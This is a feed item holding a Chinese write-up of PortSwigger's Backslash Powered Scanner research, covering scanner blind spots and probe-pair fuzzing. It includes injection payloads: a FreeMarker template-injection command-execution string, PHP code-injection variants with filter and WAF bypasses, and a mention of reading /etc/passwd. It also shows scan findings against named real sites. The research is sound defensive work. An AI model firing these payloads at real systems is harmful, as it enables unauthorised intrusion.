data-editable=&quot;true&quot; data-title=&quot;distribute-damage&quot; class=&quot;&quot;&gt;distribute-damage&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;扫描器的三个薄弱之处&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;&lt;b&gt;盲点一：Rare Technology&lt;/b&gt;&lt;br&gt;&lt;br&gt;通过安全防范扫描仪。举一个例子，来看下模板注入(SSTI)，当应用程序不做防范，将用户输入嵌入到模板中时，即会出现漏洞。根据使用的模板引擎，这可能会被利用，导致任意代码执行甚至完全控制服务器。为了使扫描器能检测到这种漏洞，需要使用到每一种模板引擎的payload硬编码。如果你的应用程序使用的是一个流行模板引擎例如FreeMarker或者Jinja，那没有什么问题。但是你的扫描器能够支持以下多少个模板引擎：&lt;br&gt;&lt;br&gt;&lt;blockquote&gt;&lt;p&gt;Amber, Apache Velocity, action4JAVA, ASP.NET (Microsoft), ASP.NET (Mono), AutoGen, Beard, Blade, Blitz, Casper, CheetahTemplate, Chip Template Engine, Chunk Templates, CL-EMB, CodeCharge Studio, ColdFusion, Cottle, csharptemplates, CTPP, dbPager, Dermis, Django, DTL::Fast (port of Django templates), Djolt-objc, Dwoo, Dylan Server Pages, ECT, eRuby, FigDice, FreeMarker, Genshi (templating language), Go templates, Google-ctemplate, Grantlee Template System, GvTags, H2o, HAH, Haml, Hamlets, Handlebars, Hyperkit PHP/XML Template Engine, Histone template Engine, HTML-TEMPLATE, HTTL, Jade, JavaServer Pages, jin-template, Jinja, Jinja2, JScore, Kalahari, Kid (templating language), Liquid, Lofn, Lucee, Mako, Mars-Templater, MiniTemplator, mTemplate, Mustache, nTPL, Open Power Template, Obyx, Pebble, Outline, pHAML, PHP, PURE Unobtrusive Rendering Engine, pyratemp, QueryTemplates, RainTPL, Razor, Rythm, Scalate, Scurvy, Simphple, Smarty, StampTE, StringTemplate, SUIT Framework, Template Attribute Language, Twital, Template Blocks, Template Toolkit, Thymeleaf, TinyButStrong, Tonic, Toupl, Twig, Twirl, uBook Template, vlibTemplate, WebMacro, ZeniTPL, BabaJS, Rage, PlannerFw, Fenom&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;这个列表只包含了一些在维基百科上众所周知的模板引擎。Michael Stepankin最近发现一个在 paypal 上的远程代码执行漏洞(&lt;a href=&quot;http://artsploit.blogspot.jp/2016/08/pprce2.html&quot; data-editable=&quot;true&quot; data-title=&quot;remote code execution vulnerability in Paypal&quot; class=&quot;&quot;&gt;remote code execution vulnerability in Paypal&lt;/a&gt;),起因于&lt;a href=&quot;https://github.com/linkedin/dustjs&quot; data-editable=&quot;true&quot; data-title=&quot;Dust.js&quot; class=&quot;&quot;&gt;Dust.js&lt;/a&gt; 产生的 SSTI，这个来自 LinkedIn 的模板引擎明显不在上面的列表之中。匮乏的扫描器适用范围同样适用于使用无数数据库语言的用户，更不用说那些超出理解范围的扭曲框架的代码注入。&lt;br&gt;&lt;/p&gt;&lt;p&gt;此外，使扫描器对后端技术进行假设，这意味着改变任何一个服务端组件的改变都会破坏对其余漏洞的检测。例如，在 SELinux 下运行一个 Webapp 能够组织对本地文件包含和外部实体包含漏洞的检测，这些检测通常通过读取 /etc/passwd来验证，而 SELinux 将会阻止这些行为。&lt;/p&gt;&lt;p&gt;最终，扫描器对于使用小众技术的应用程序进行检测时，性能严重下降。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;盲点二：Variants and Filters&lt;/b&gt;&lt;br&gt;&lt;br&gt;利用一个众所周知的语言来思考一个经典的漏洞:在 PHP 双引号中的 blind code injection。扫描器可以通过发送一个 time-delay 的 payload 轻易检测出这个问题：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&quot;.sleep(10).&quot;&lt;/code&gt;&lt;p&gt;到目前还好。但是如果应用程序碰巧过滤了括号，代码将会出错，但是我们仍然可以利用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&quot;.`sleep 10`.&quot;&lt;/code&gt;&lt;p&gt;如果应用程序的 WAF 检测 payload 是否存在 ’sleep’ 这个关键词，我们几乎可以肯定会再次出错。如果应用程序能正常化输出，那么我们仍然可以通过利用 Cyrillic 的’e’字符，希望能变成正常的’e’从而执行：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&quot;.sl%D0%B5ep(10).&quot;&lt;/code&gt;&lt;p&gt;如果应用程序过滤了双引号，我们会再一次获得错误的结果，但是我们仍然能轻易的执行我们的代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;{${sleep(10)}}&lt;/code&gt;&lt;p&gt;这三个例子中，我在渗透测试中遇到过两个，在别人的 Writeup 中看到了第三个。&lt;/p&gt;&lt;p&gt;扫描器的设计使得他们很容易因为意想不到的过滤和变体而检测失败。扫描器当然可以发送上面展示的变体 payload，但是这些仅仅是一个漏洞的众多变体中的三个。发送足够的 payload覆盖每一种的漏洞的每一个变体，在现在的网络速度上基本上是难以置信的 --因为有数百万个 payload。扫描器仅限于发送’best-effort’（注释:尽力而为）的 payload，这意味着即使是使用双引号代替单引号封装 SQL 语句也会导致扫描器的检测失败。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;b&gt;盲点三：Buried Vulnerabilities&lt;/b&gt;&lt;br&gt;&lt;br&gt;下面这个请求是 Ebay 的一个端点上的HTTP请求，以前被用作 PHP 的代码注入，那么扫描器该从何处加载 payload?&lt;code lang=&quot;text&quot;&gt;GET /search/?q=david HTTP/1.1
Host: sea.ebay.com.sg
User-Agent: Mozilla/5.0 etc Firefox/49.0
Accept: text/html
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sea.ebay.com.sg/
Cookie: session=pZGFjciI6IjAkLCJlx2V4cCI6MTA4
Connection: close&lt;/code&gt;&lt;p&gt;很明显的加载地点是参数’q’，但是并没有起作用，同样也不是 Referer，User-Agent 或者是 Session cookie。一个经验丰富的测试者可能会尝试在不曾出现过的 headers 中加载 payload，例如 Origin，X-Forwarded-For 或者是 X-Forwarded Host。这些 headers 没有一个起作用的，而扫描器扫描到这个地步时，已经发送了大量的 payload 且都没有成功，David Vieira-Kurz 发现有可能可以通过传入第二个参数在此端点形成代码注入，通过创建一个服务端的恶意数组&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;GET /search/?q=david&amp;amp;q[1]=sec{${phpinfo()}}&lt;/code&gt;&lt;p&gt;他之所以尝试这种攻击方式时因为参数 q 会引起一个具有拼写检查，关键字过滤的搜索功能，这提供了一个线索表明了服务端会发生一些有趣的事情。在这里，我们再次遇到一个漏洞，即只有扫描器对每个端点可能发送的有效载荷数量没有限制（或者可以说是检测到的拼写检查器），才能检测到。这是一个比较极端的例子，但是其他很少有用的 header 比如 Accept-Language 处的漏洞也很可能被遗漏。&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;br&gt;&lt;h2&gt;&lt;b&gt;另一种扫描方式&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在这一点上你该知道如何让应用程序或多或少的做到防扫描；只需要使用不出名的 web 语言编写代码，将数据与非标准语法的 NoSQL 变体存储在一起，在上面分层覆盖 WAF。&lt;/p&gt;&lt;p&gt;那么手工测试者时如何避开这些盲点的？最根本的区别是他们对于无用、有趣、可疑或者有效输入的概念。David Vieira-Kurz 的观察指出一个具有拼写检查功能的输入点会直接导致他的广泛审计，可能这会在你的正常输入中浪费时间。&lt;/p&gt;&lt;p&gt;我们可以从中学到，相比起扫描漏洞，我们需要的是扫描那些有趣的行为。接着，我们可以进一步调查以确认产生这些有趣行为的极小部分的输入。这种识别漏洞的迭代方法在漏洞确实存在时非常的灵活和高效。不会产生任何有趣行为的输入被快速的忽略掉，为持续调查更有希望的输入节省时间，形成一个部署探针-扫描比对-结果研究的循环：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3de0995ac208e3bdb92f38a0620af4b0.png_r.jpg&quot;&gt;&lt;br&gt;&lt;h2&gt;&lt;b&gt;可疑的输入转换&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;用于探测可疑行为的初始检测应该尽可能的简单和通用。例如如下用于利用 FreeMarker SSTI的 payload：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&amp;gt; ${ex(&quot;id&quot;)}&lt;/code&gt;&lt;p&gt;这可以很轻易的回滚成一个更为通用的 payload 用以检测大多数利用了流行语法的模板引擎：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;${7*7} (expect 49)&lt;/code&gt;&lt;p&gt;如何扩大用于检测通用代码的覆盖范围？作者尝试了如下方法：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;7*7 (expect 49)&lt;/code&gt;&lt;p&gt;但其仅能够适用于数字输入。为了检测字符串的注入，可以这样做：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;\x41 (expect A)&lt;/code&gt;&lt;p&gt;然而很多语言，特别是包括 SQL，并不支持 Hex 转义。那下面这个探针则可以做到更一步的通用，基本支持所有的语言：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;\\ (expect \)&lt;/code&gt;&lt;p&gt;在这一点上作者首先探测出可疑的输入变换。接着进入到扫描阶段的开发过程，在大量的应用程序中尝试这种 payload 看看会发生什么。如果探针是有效的且试验台足够大（稍后讲解），那么将会得到一组适当大小的结果，从而手动调查并从中发现有趣有用的东西。&lt;/p&gt;&lt;p&gt;这种情况下，第一步去理解应用程序的行为是为了寻找出其他的输入变换，例如 \x41=&amp;gt;A。通过对比应用程序对已知的不良字符和其他字符的处理方式，可以获得一些微妙的线索，知道在服务端哪些字符具有特殊的意义。例如，以\zz为基线，可以很轻易的发现异常：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;\zz =&amp;gt; \zz

 \&quot; =&amp;gt; \&quot;
 \$ =&amp;gt; \$
 \{ =&amp;gt; {
 \x41 =&amp;gt; \x41&lt;/code&gt;&lt;p&gt;上面这组测试说明了“{”这个字符具有特殊的意义。通过多次重复和完善探测的过程，可以循环成一个‘实施’阶段，自动化实行。下面这张扫描器截图展示一个易受到 Markdown 注入的页面的输出情况：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-63540bf7823bde3839b1530d266a8797.png_r.jpg&quot;&gt;&lt;p&gt;这是一个没有什么薄弱点的页面，只不过是在输入上调用了 stripslashes() (注释：用于删除反斜杠)&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e30f60342a271510aa4b8c49b983a17d.png_r.jpg&quot;&gt;&lt;p&gt;这种自动化跟进意味着我们将一目了然的知道端点的可利用性。潜在的进一步优化是对具体转换的指纹的识别与分类。&lt;/p&gt;&lt;p&gt;值得注意的是即使这种技术有能力检测出大量的脆弱点，在大部分输入上，它只会发送一次单独的请求。这种灵活性和效率性的组合是迭代扫描的核心。&lt;/p&gt;&lt;p&gt;如果你意识到（或者能构建）目标是明显存在问题的，则可以验证扫描器的误报率。作者发现扫描器无法识别 JSON 响应中的漏洞，因为虽然服务端会将\\解码成\，但是当其被嵌入 JSON字符串的时候会重新从\转义成\\。通过在适当的地方进行 JSON 解码响应很容易能解决这个问题。&lt;/p&gt;&lt;p&gt;不幸的是，还有一个更为严重的弱点。这种扫描方式依赖于用户的输入被处理后展示出来。例如，如果一个应用程序将用户的输入拼接一个 SQL 的 SELECT 语句中，但是并不会显示该查询，这个漏洞将会被完全忽视掉。这是一个最根本的缺陷，依赖于可疑的输入转换来检测漏洞。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Probe-Pair Fuzzing&lt;/b&gt;&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;&lt;b&gt;核心逻辑&lt;/b&gt;&lt;br&gt;&lt;br&gt;我们可以通过分析整个响应内容和判断我们的输入是否造成了明显的变化来避免依赖于输入转换。在最基本的情况下，这与经典的 webapp fuzzer 非常的相似（在应用程序中提供输入来查看是否崩溃），并且很多渗透测试者都很熟悉适用 Burp Intruder 和 fuzzlists 来实现部分自动化。他们并不会局限于只是查看自动扫描结果的状态码和检查错误信息，而是将细微到某个单独的单词或者空白行的消失都当作是一种变化。&lt;p&gt;就像手工测试者一样，我们可以利用探针来获取更多的信息。首先，我们通过发送包含随机字母数字字符的探针来识别出应用程序正常的响应。这将会被当作是一个基准响应。如果携带’的探针获得的响应始终与基准响应不同，那么就可以断定’这个字符对于应用程序来说有着特殊的意义。但这并不表明就是一个漏洞，或许只是因为应用程序拒绝携带’的输入。再次的，我们可以利用 backslashes 来摆脱这个困境。如果应用程序对于携带\’的探针的响应与随机字母数字的探针响应相同，我们便可以断定对于’的异常响应是因为未能逃逸。下面的图可能更有意义。笑脸和哭脸分别代表了 ’interseting’ 和 ’boring’ ：&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-afb7fc8bafee2c63e2d6ad7138105b80.png_r.jpg&quot;&gt;&lt;br&gt;这种技术并不仅局限于识别字符串的注入。我们还可以通过替换探针来识别其他各种环境的注入。每一种额外的探针都只需要几行代码，所以我们已经在使用不少的代码了：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&#39; vs \&#39; // single-quoted string
&#39; vs &#39;&#39; // single-quoted string (alternative escaping)
&quot; vs \&quot; // double-quoted string
7/0 vs 7/1 // number
${{ vs $}} // interpolation
/**/ vs /*/ // raw code
,99 vs ,1 // order-by
sprintz vs sprintf // function name&lt;/code&gt;&lt;p&gt;我们还可以通过很多探针的共同使用迭代搜集一个潜在漏洞的信息。当遇到一个字符串注入时，Backslash Powered Scanner 将首先识别正在使用的引号，接着是字符的连接方式，识别可能的函数调用，最后发送一组特定语言的函数尝试来识别后端语言。下面的一个截图展示了一个指出了有 Javascript 注入漏洞的应用程序的扫描输出。注意，每个阶段获取的信息都被用于下个阶段。&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8821bbb90fcd3fd43f67d970d3d97e0b.png_r.jpg&quot;&gt;&lt;br&gt;即使扫描器无法识别确切的漏洞，它依然会报告漏洞：它仅显示所有成功的探针。这意味着它有效的将输入分成三类:’boring’(没有问题存在的)，’vulnerable’（一种显然存在漏洞的已知语言）,’interseting’（很多探针成功，应用程序容易受到未知问题的影响）。&lt;br&gt;&lt;/p&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;&lt;b&gt;类型的变化&lt;/b&gt;&lt;br&gt;应用程序以两种不同方式之一来处理修改后的输入。大多数输入容易受到服务端注入的影响，特别是那些来源于于自由文本格式的输入，例如评论，只有当触及语法错误时服务端才会显示不同的响应：&lt;code lang=&quot;text&quot;&gt;/post_comment?text=baseComment 200 OK
/post_comment?text=randomtext 200 OK
/post_comment?text=random&#39;text 500 Oops
/post_comment?text=random\&#39;text 200 OK&lt;/code&gt;&lt;p&gt;其他的输入上，任何与预期输入不同都会引起一个错误：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/profile?user=bob 200 OK
/profile?user=randomtext 500 Oops
/profile?user=random&#39;text 500 Oops
/profile?user=random\&#39;text 500 Oops
/profile?user=bo&#39;||&#39;b 200 OK
/profile?user=bo&#39;|z&#39;b 500 Oops
&lt;/code&gt;&lt;p&gt;后一种情况很难处理。为了找到这样响应的漏洞，我们需要跳过引号识别阶段并且猜测字符的连接方式以找出漏洞的证明，这使扫描器效率更低。由于无法将随机文本放入探针中，我们被限制在一定数量的唯一探针，使得可靠的指纹识别响应变得更加困难。在写这篇文章时，扫描器还不会处理这种情况。&lt;/p&gt;&lt;p&gt;这种限制不适用于检测数字注入的输入 -- 给定了一个基数，使用简单的算术有无数的方式能够表达相同的数目。我选择x/1和x/0，因为除以零的好处时会在某些情况下抛出异常。&lt;/p&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;识别有意义的响应差异&lt;/b&gt;&lt;br&gt;这种技术的核心问题是识别应用程序对两个不同探针的响应是否一致。只是一个简单的字符串的比较在整个应用程序中是没有什么作用的，因为应用程序本身就是动态的。响应中充满了动态生成的一次性令牌，时间戳，缓存以及对输入的响应。&lt;/p&gt;&lt;p&gt;作者三年前遇到这个问题时，他意识到响应是由静态的内容和动态的 ’fuzzy points’ 共同组成独。因此，作者尝试用一组响应来生成一个正则表达式，将静态的内容与通配符拼接到一起。为了简洁起见，作者只提及了这种方法的一些小问题。最开始，计算密集度，作者使用的最长公共子序列的实现是 O(n2)；处理响应花费的时间与响应长度的平方成正比。正则表达式通常十分复杂，因此扫描到错误的应用程序会导致扫描器停止工作。它也无法处理和正则完全不同的应用程序响应，也无法处理顺序改变的响应。甚至响应中的时间戳也引起了困难，因为有些时间戳每10，60或者100秒才会产生改变。最后，调试起来非常困难，因为响应内容与500多行的正则表达式不匹配的原因很难确定。这些问题听起来好像都可以解决，但是作者尝试解决他们这也是为什么扫描器代码在两年前没有放出来。&lt;/p&gt;&lt;p&gt;相反的，Backslash Powered Scanner 使用更简单的方法计算每个响应的属性值，并注意到响应中的哪些属性没有发生变化。其中包括状态码，content type，HTML 结构，行数，单词数，输入的处理数量以及各种关键字的出现频率。&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;Hunting Findings&lt;/b&gt;&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;&lt;b&gt;分布式扫描系统&lt;/b&gt;&lt;br&gt;&lt;br&gt;为了保证扫描器在扫网站的时候不会出现发包过快导致 IP 被屏蔽的问题，以及扫描时超出授权的测试范围，我需要限制它每3秒向一个网站发送一个请求，但 Burpsuite 只支持线程调节，为此，我又写了一个扩展，用于实现分流，也就是前面说的功能，它可以在不同的主机上交叉扫描，提供整体扫描速度，又不被屏蔽。还有就是可以只扫描不常用的参数等。&lt;/li&gt;&lt;li&gt;&lt;b&gt;样本结果&lt;/b&gt;&lt;br&gt;&lt;br&gt;为了说明扫描器所提供的发现的漏洞类型以及如何阐述他们，作者将检查一组选定的扫描结果。这或许会帮助我们理解为什么 Backslash Powered Scanner 相比起像一个漏扫，更像是一个技术理解有限的助理。&lt;/li&gt;&lt;ol&gt;&lt;li&gt; Mysql injection &lt;br&gt;&lt;br&gt;以下结果来源于一个User-Agent头存在SQL注入的站点：&lt;code lang=&quot;text&quot;&gt;Basic fuzz (\z`z&#39;z&quot;\ vs \`z\&#39;z\&quot;\\)
Content: 5357 vs 5263

String - apostrophe (\zz&#39;z vs z\\\&#39;z)
Content: 5357 vs 5263

Concatenation: &#39;|| (z||&#39;z(z&#39;z vs z(z&#39;||&#39;z)
Content: 5357 vs 5263

Basic function injection (&#39;||abf(1)||&#39; vs &#39;||abs(1)||&#39;)
Content: 5281 vs 5263

MySQL injection (&#39;||power(unix_timestanp(),0)||&#39; vs &#39;||power(unix_timestamp(),0)||&#39;)
Content: 5281 vs 5263&lt;/code&gt;&lt;br&gt;扫描器识别出输入是’interesting’，并且通过注入一个只存在于 Mysql 中的函数正确的识别出了漏洞。’Content:5357 VS 5263’这样的一行是用来表示扫描器对比了两个结果。在这个例子里，两个响应中单词的数目是不同的。当这么多数量的证据显现出来时，那么问题就不太可能是假的。&lt;br&gt;&lt;/li&gt;&lt;li&gt;存在过滤的 code injection&lt;br&gt;&lt;br&gt;下面这个例子来源于一个已经经过多次测试的网站，这将充分展现扫描器的能力：&lt;code lang=&quot;text&quot;&gt;String - doublequoted (\zz&quot; vs \&quot;) 
error: 1 vs 0 
Content: 9 vs 1 
Tags: 3 vs 0 

Concatenation: &quot;. (z.&quot;z(z&quot;z vs z(z&quot;.&quot;z) 
error: 1 vs 0 
Content: 9 vs 1 
Tags: 3 vs 0 

Interpolation - dollar (z${{z vs }}$z) 
error: 1 vs 0 
Content: 9 vs 1 
Tags: 3 vs 0&lt;/code&gt;&lt;p&gt;这是一个容易受到 PHP 代码注入的点，但是应用程序过滤了括号。因为括号被过滤，所以扫描器就无法注入一个函数，但是可以一点一点的手工测试尝试执行任意的shell命令。&lt;/p&gt;&lt;p&gt;作者认为这样的问题被之前的渗透测试人员忽略可能是因为注入点在文件路径处，这不是一个手工测试者会花费大量时间测试代码执行的地方。但为什么应用程序会在一个路径上调用 eval()，这就不得而知了。&lt;/p&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;以前存在过的漏洞&lt;br&gt;&lt;br&gt;以下的发现表明当前状态的 sea.ebay.com 站点上的输入是很容易受到 PHP 代码执行攻击的。可以清晰的看到应用程序对携带“{”的输入所产生的完全不同的响应。&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7cb04e207cce4631e7687da49d6c695b.png_r.jpg&quot;&gt;值得注意的是响应状态与测试者预期的情况完全不同，应当使服务器报错的${{z却使200的状态，而本应该无害的字符却导致了500的错误。搜索功能虽然损坏了，但是扫描器却能给我们一个信息，就是这儿以前可能存在这样的漏洞。因为扫描器具有极高的效率，因此在每一个输入点上都尝试 PHP 的 bypass 序列是完全合理的。&lt;br&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;正则表达式注入&lt;br&gt;&lt;br&gt;扫描器经常会报告很多正则表达式注入，这是一个低危漏洞，它可以干扰应用程序的运行，严重时可能会导致拒绝服务。但有一个例外的是，当服务器上的 PHP 版本低于5.4.7时，利用&lt;a href=&quot;https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace&quot; data-title=&quot;null byte to specify the &#39;e&#39; flag&quot; class=&quot;&quot; data-editable=&quot;true&quot;&gt;null byte to specify the &#39;e&#39; flag&lt;/a&gt;，这个注入将会升级为任意代码执行。这个技术被用来&lt;a href=&quot;https://www.phpmyadmin.net/security/PMASA-2016-27/&quot; data-title=&quot;攻击过phpmyadmin&quot; class=&quot;&quot; data-editable=&quot;true&quot;&gt;攻击过phpmyadmin&lt;/a&gt;，作者证实了扫描器能找到这种漏洞，通常的报告如下：&lt;code lang=&quot;text&quot;&gt;Diffing scanner:
Backslash (\ vs \\)

Transformation Scanner:
\0 =&amp;gt; Truncated 
\1 =&amp;gt; Truncated 
\$ =&amp;gt; &amp;gt;nbsp;
$ =&amp;gt; $&lt;/code&gt;&lt;p&gt;\0经常被用于识别正则表达式注入。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;GET /folder?q=foo\0bar HTTP/1.1

HTTP/1.1 301 Moved Permanently
Location:
https://redacted.com/folder/?q=foohttp://redacted.com/folder/bar&lt;/code&gt;&lt;/li&gt;&lt;li&gt;Escaping Flaws&lt;br&gt;&lt;br&gt;扫描器发现了一个有趣却无用的缺陷，一个流行框架将输入放入了 cookie 中：&lt;br&gt;&lt;code lang=&quot;text&quot;&gt;foo&quot;z: Set-Cookie: bci=1234; domain=&quot;foo\&quot;z&quot;;
foo\: Set-Cookie: bci=1234; domain=&quot;foo\&quot;;
foo&quot;z\: 500 Internal Server Error&lt;/code&gt;这个框架是非常受欢迎的，作者添加了新的探针来跟进分类这个问题，让其余的测试者可以不用在这个上浪费时间：&lt;br&gt;&lt;code lang=&quot;text&quot;&gt;Basic fuzz  (\z`z&#39;z&quot;\ vs \`z\&#39;z\&quot;\\)
    exception: 1 vs 0
 Doublequote plus slash  (z&quot;z\ vs z\z)
    exception: 1 vs 0&lt;/code&gt;&lt;/li&gt;&lt;li&gt; Semantic False Positives&lt;br&gt;&lt;br&gt;利用一个构造的词来测试功能注入：&lt;br&gt;&lt;code lang=&quot;text&quot;&gt;Function hijacking (sprintg vs sprintf) 
&amp;lt;div: 13 vs 14&lt;/code&gt;&lt;br&gt;URL: &lt;a href=&quot;https://code.google.com/hosting/search?q=sprintg&quot; class=&quot;&quot;&gt;https://code.google.com/hosting/search?q=sprintg&lt;/a&gt;显而易见存在这个问题，参数 q用来搜寻一个很大的 codebase ，其中 ’sprintf’ 是比 ’sprintg’ 更为常用的术语。搜索功能经常被扫描器列为优先搜索，特别是那些支持高级语法的功能，他们很多时候和代码执行很相似。&lt;br&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt; 应用程序防火墙&lt;br&gt;&lt;p&gt;应用程序防火墙对于为扫描器提供了另一种 ’interesting’ 输入的识别。扫描器发现内联注释的代码被防火墙所忽略：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;0/**z&#39;*/ vs 0/*/*/z&#39;*/&lt;/code&gt;&lt;p&gt;手工测试显示，即使被 HTML 注释，iframe 还是能识别&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;0&amp;lt;!--foo--&amp;gt; vs 0&amp;lt;!--foo-&amp;gt;
0&amp;lt;iframe&amp;gt; vs 0&amp;lt;zframe&amp;gt;&lt;/code&gt;&lt;p&gt;看起来好像是防火墙为了删除有害的 HTML 标签和注释而重写了输入。输入重写能很好的使 xss 过滤器失效。像之前一样，我们自动化跟进 HTML 注释，防止在测试中再次遇到这样的 WAF。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;SOLR JSON Injection&lt;br&gt;&lt;br&gt;扫描器标记了很多搜索功能的有趣行为:&lt;code lang=&quot;text&quot;&gt;Basic fuzz (\z`z&#39;z&quot;\ vs \`z\&#39;z\&quot;\\) 
Content: 1578 vs 1575 
Backslash (\ vs \\) 
Content: 1576 vs 1575 
String - doublequoted (\zz&quot; vs \&quot;) 
Content: 1578 vs 1575&lt;/code&gt;&lt;p&gt;手工测试显示应用程序会解码输入的 UNICODE -即查找\u006d\u0069\u0072\u0072\u006f\u0072和查找’mirror’是一样的结果。这表明用户的输入没有经过转义直接进入到了 json 里面，这样的话我们就有可能突破查询字符串并更改查询结构。&lt;/p&gt;&lt;br&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/ol&gt;&lt;br&gt;&lt;h2&gt;&lt;b&gt;得到的教训&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这些例子都清晰的表明，迭代过程是非常重要的，这意味着测试者可以一目了然的将一个明显的问题和需要多次验证的问题进行区分。目前，搜索功能，WAF 和正则表达式注入还有待发展，暂时不会导致任何有利用价值的漏洞。由于探针的灵活性，我们几乎可以将以后遇到的各种问题都加入到探针中进行自动化跟进分类。&lt;/p&gt;&lt;p&gt;扫描器还能获得很多有用的信息，虽然有些并不会导致漏洞。&lt;/p&gt;&lt;p&gt;很多应用程序上的漏洞都被 WAF 所防御，因为 payload 的简洁性导致他们往往会被检测，但是作者发现 WAF 会忽略一些来自可信 IP 的数据，因此作者尝试了分布式发包来使得办公室的IP 不会被 ban。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;后续研究&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;扫描器所使用的技术和代码已经能够检测远超服务端注入的漏洞。作者将继续尝试让扫描器识别 WAF 和搜索功能。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;结论&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;经典扫描器在扫描服务端的注入漏洞时存在着几个盲点。通过对手工测试方式的模拟，开发了一款能够避免这些盲点并且十分高效的扫描器。这款扫描器目前将输入分为 ’boring’, ’interesting’ 和 ’vulnerable’ 三种情况。’interesting’ 需要测试者手动检查，因此，目前这个扫描器仅适用于安全从业者。但是，随着时间的推移，更多的 ’interesting’ 将会慢慢变为 ’vulnerable’，这款扫描器将会适用于更为广泛的用户。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Burpsuite 中开启反斜线探索式扫描&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在 BApp Store 中直接安装「Backslash Powered Scanning」这个扩展，其它情况可以参考扩展的开源地址的安装方式：&lt;a href=&quot;https://github.com/portswigger/backslash-powered-scanner#installation&quot; data-editable=&quot;true&quot; data-title=&quot;PortSwigger/backslash-powered-scanner&quot; class=&quot;&quot;&gt;PortSwigger/backslash-powered-scanner&lt;/a&gt;。&lt;/p&gt;&lt;p&gt;安装好之后我们只需要开启代理，访问需要测试的站点，再到「Target」中对目标站点开启「Acitvely scan this host」也就是主动扫描即可进行测试。&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1952596ec01945f7952ef42334c85023.png_r.jpg&quot; data-rawwidth=&quot;395&quot; data-rawheight=&quot;142&quot;&gt;开启扫描后，我们打开「Scanner 」模块，如果出现 Interesting 开头的的 Issue，就表示这可能是一个有趣的漏洞了，Boring  则表示扫描器认为没什么用但符合扫描特征，而 Vuln 就是说扫描器已经验证是漏洞了。&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;参考链接：&lt;/b&gt;&lt;/h2&gt;&lt;a href=&quot;https://github.com/portswigger/backslash-powered-scanner&quot; data-editable=&quot;true&quot; data-title=&quot;PortSwigger/backslash-powered-scanner&quot; class=&quot;&quot;&gt;PortSwigger/backslash-powered-scanner&lt;/a&gt;&lt;a href=&quot;https://github.com/portswigger/backslash-powered-scanner&quot; data-editable=&quot;true&quot; data-title=&quot;PortSwigger/backslash-powered-scanner&quot; class=&quot;&quot;&gt;&lt;br&gt;&lt;/a&gt;&lt;a href=&quot;http://blog.portswigger.net/2016/11/backslash-powered-scanning-hunting.html&quot; class=&quot;&quot; data-editable=&quot;true&quot; data-title=&quot;Backslash Powered Scanning: Hunting Unknown Vulnerability Classes&quot;&gt;Backslash Powered Scanning: Hunting Unknown Vulnerability Classes&lt;/a&gt;</description>
<author>TwoSecurity</author>
<guid isPermaLink="false">2017-05-30-27166471</guid>
<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Rails 中 ActiveRecord 的不当使用产生 SQLi 风险</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-05-26-27131797.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Rails 中 ActiveRecord 的不当使用产生 SQLi 风险&lt;/title&gt;
